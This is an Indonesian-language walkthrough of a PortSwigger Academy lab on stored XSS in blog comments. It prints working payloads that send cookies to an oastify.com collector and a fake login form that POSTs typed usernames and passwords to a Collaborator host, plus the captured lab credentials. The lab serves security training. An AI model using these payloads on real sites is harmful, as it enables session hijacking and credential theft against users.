# Mengeksploitasi Cross-Site Scripting untuk Menangkap Password

Lab ini mengandung kerentanan **Stored XSS** pada fungsi komentar blog. Pengguna yang menjadi korban akan melihat semua komentar setelah diposting. Untuk menyelesaikan lab ini, eksploitasi kerentanan ini untuk mencuri username dan password korban, kemudian gunakan kredensial tersebut untuk masuk ke akun korban.

**Catatan:** Untuk mencegah platform Academy digunakan untuk menyerang pihak ketiga, firewall kami memblokir interaksi antara lab dan sistem eksternal yang sewenang-wenang. Untuk menyelesaikan lab ini, Anda harus menggunakan server publik default Burp Collaborator.

Beberapa pengguna mungkin menyadari bahwa ada solusi alternatif untuk lab ini yang tidak memerlukan Burp Collaborator. Namun, metode ini jauh kurang halus dibandingkan dengan mencuri kredensial.

---------------------------------------------

## Referensi:

- [PortSwigger: Cross-Site Scripting](https://portswigger.net/web-security/cross-site-scripting)

---------------------------------------------

## Langkah-Langkah Eksploitasi

### 1. Menguji Kerentanan XSS pada Salah Satu Postingan Blog

Pertama, kita menguji apakah terdapat kerentanan XSS pada salah satu postingan blog. Payload berikut berhasil:

```html
<script>alert('XSS')</script>
```

![Langkah 1](images/Exploiting%20cross-site%20scripting%20to%20capture%20passwords/1.png)

Payload ini menjalankan fungsi `alert` untuk memastikan bahwa kerentanan XSS benar-benar ada.

### 2. Menguji Payload Sederhana yang Dieksekusi

Selanjutnya, kita mencoba payload XSS yang lebih kompleks:

```html
<script>var i=new Image;i.src="http://ecu0uhyerytdj8d8vdyuowv8zz5qtlha.oastify.com/?cookie="+document.cookie;</script>
```

Atau alternatif lain:

```html
<img src=x onerror="this.src='http://ecu0uhyerytdj8d8vdyuowv8zz5qtlha.oastify.com/?cookie='+document.cookie; this.removeAttribute('onerror');">
```

![Langkah 2](images/Exploiting%20cross-site%20scripting%20to%20capture%20passwords/2.png)

Payload ini mencoba mencuri cookie sesi pengguna dengan mengirimkannya ke server eksternal.

### 3. Menerima HTTP Request dengan Cookie

Setelah mengirimkan payload, kita menerima permintaan HTTP yang berisi cookie sesi:

![Langkah 3](images/Exploiting%20cross-site%20scripting%20to%20capture%20passwords/3.png)

### 4. Mengatur Cookie di Debugger Firefox

Kami mencoba mengatur cookie secara manual menggunakan debugger Firefox:

```javascript
document.cookie="secret=5yN1hPLMMamjE1mFPVb7ocKMq7BSYyTK"
```

![Langkah 4](images/Exploiting%20cross-site%20scripting%20to%20capture%20passwords/4.png)

Namun, metode ini tidak berhasil dalam menyamar sebagai korban.

### 5. Solusi: Menangkap Username dan Password Menggunakan Burp Collaborator

Untuk mencuri kredensial (username dan password), kita menggunakan pendekatan berikut:

```html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
    method:'POST',
    mode: 'no-cors',
    body:username.value+':'+this.value
});">
```

Payload ini akan mengirimkan kombinasi username dan password ke server Burp Collaborator setiap kali password diisi.

![Langkah 5](images/Exploiting%20cross-site%20scripting%20to%20capture%20passwords/5.png)

### 6. Menerima Respon dari Burp Collaborator

Setelah payload dijalankan, kami menerima kredensial korban melalui Burp Collaborator:

![Langkah 6](images/Exploiting%20cross-site%20scripting%20to%20capture%20passwords/6.png)

**Kredensial yang Dicuri:**

```
administrator:ec7ga43qyd9zisyb4h4i
```

![Langkah 7](images/Exploiting%20cross-site%20scripting%20to%20capture%20passwords/7.png)

### 7. Menggunakan Kredensial untuk Masuk ke Akun Korban

Dengan kredensial yang dicuri, kita dapat masuk ke akun korban:

![Langkah 8](images/Exploiting%20cross-site%20scripting%20to%20capture%20passwords/8.png)

## Penjelasan

**Cross-Site Scripting (XSS)** adalah kerentanan keamanan yang memungkinkan penyerang untuk menyuntikkan skrip berbahaya ke dalam situs web yang dipercaya oleh pengguna. Dalam kasus ini, kerentanan **Stored XSS** memungkinkan skrip berbahaya disimpan di server (misalnya, dalam komentar blog) dan dijalankan setiap kali pengguna melihat konten tersebut.

### Payload Sederhana

Payload awal yang digunakan adalah skrip sederhana yang menampilkan alert. Ini digunakan untuk mengkonfirmasi keberadaan kerentanan XSS.

```html
<script>alert('XSS')</script>
```

### Payload untuk Mencuri Cookie

Payload berikutnya mencoba mencuri cookie sesi pengguna dengan mengirimkannya ke server eksternal:

```html
<script>var i=new Image;i.src="http://ecu0uhyerytdj8d8vdyuowv8zz5qtlha.oastify.com/?cookie="+document.cookie;</script>
```

Atau:

```html
<img src=x onerror="this.src='http://ecu0uhyerytdj8d8vdyuowv8zz5qtlha.oastify.com/?cookie='+document.cookie; this.removeAttribute('onerror');">
```

### Payload untuk Menangkap Username dan Password

Solusi yang lebih canggih melibatkan menangkap username dan password pengguna ketika mereka mengisi formulir login:

```html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
    method:'POST',
    mode: 'no-cors',
    body:username.value+':'+this.value
});">
```

- **`fetch` API:** Mengirimkan permintaan HTTP POST ke subdomain Burp Collaborator Anda.
- **`method: 'POST'`:** Menentukan metode HTTP yang digunakan adalah POST.
- **`mode: 'no-cors'`:** Menghindari pembatasan CORS sehingga permintaan dapat dikirimkan tanpa diblokir.
- **`body:username.value+':'+this.value`:** Mengirimkan kombinasi username dan password sebagai isi tubuh permintaan.

### Proses Pencurian dan Penyamarannya

1. **Pencurian Kredensial:**
   
   Ketika korban melihat komentar yang berisi payload ini dan mengisi formulir login, skrip akan mengirimkan kredensial mereka ke server Burp Collaborator.

2. **Pengambilan Kredensial:**
   
   Anda kemudian memantau interaksi di Burp Collaborator dan mengambil kredensial yang dikirimkan oleh korban.

3. **Penyamaran:**
   
   Dengan menggunakan kredensial yang dicuri, Anda dapat masuk ke akun korban tanpa perlu mengetahui kredensial asli.

## Kesimpulan

Eksploitasi **Stored XSS** memungkinkan penyerang untuk mencuri kredensial pengguna dan menyamar sebagai mereka, memberikan akses tidak sah ke akun pengguna. Dengan menggunakan **Burp Collaborator**, metode ini menjadi lebih tersembunyi dan efektif dibandingkan dengan metode sederhana seperti penggunaan `alert()`. Penting untuk selalu memvalidasi dan menyaring input pengguna untuk mencegah kerentanan XSS.

## Referensi Tambahan

- [OWASP Cross-Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
